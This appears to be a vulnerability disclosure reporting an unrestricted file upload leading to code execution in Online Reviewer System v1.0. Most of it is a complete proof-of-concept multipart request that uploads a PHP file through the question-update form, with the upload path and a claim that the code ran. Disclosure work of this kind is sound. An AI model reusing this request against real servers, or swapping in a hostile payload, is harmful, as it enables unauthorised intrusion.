## Online Reviewer System v1.0 by code-projects has arbitrary code execution (RCE)

Bug_author: wangxinyu

The program is built using the xmapp-php8.1 version

vendor: https://code-projects.org/online-reviewer-system-in-php-with-source-code/

Vulnerability url: http://ip/reviewer/system/system/admins/assessments/databank/question-update.php?id=233

Loophole location： Arbitrary file upload vulnerability exists in syetem image upload point in system info (RCE)

Request package for file upload：

```sql
POST /reviewer/system/system/admins/assessments/databank/btn_functions.php?action=update HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.88/reviewer/system/system/admins/assessments/databank/question-update.php?id=233
Cookie: PHPSESSID=ivleqt3n6ncjlo4goroptbndau
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------29009162236917
Content-Length: 1369

-----------------------------29009162236917
Content-Disposition: form-data; name="difficulty_id"

2
-----------------------------29009162236917
Content-Disposition: form-data; name="test_desc"

ECE
-----------------------------29009162236917
Content-Disposition: form-data; name="test_subject"

Sturctural Design
-----------------------------29009162236917
Content-Disposition: form-data; name="question_id"

233
-----------------------------29009162236917
Content-Disposition: form-data; name="description"

sa
-----------------------------29009162236917
Content-Disposition: form-data; name="option_a"

qw
-----------------------------29009162236917
Content-Disposition: form-data; name="option_b"

aq
-----------------------------29009162236917
Content-Disposition: form-data; name="option_c"

aq
-----------------------------29009162236917
Content-Disposition: form-data; name="option_d"

q
-----------------------------29009162236917
Content-Disposition: form-data; name="answer"

A
-----------------------------29009162236917
Content-Disposition: form-data; name="personImage"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo();
-----------------------------29009162236917
Content-Disposition: form-data; name="btnUpdateQuestion"

Save changes
-----------------------------29009162236917--

```

The files will be uploaded to this directory \reviewer\system\system\admins\assessments\databank\files
<img width="598" height="357" alt="image" src="https://github.com/user-attachments/assets/c4d12b40-2409-4389-bb31-b73eee371598" />


We visited the directory of the file in the browser and found that the code had been executed

<img width="1281" height="779" alt="image" src="https://github.com/user-attachments/assets/9792a659-130f-4145-b2b7-b4107241d69f" />
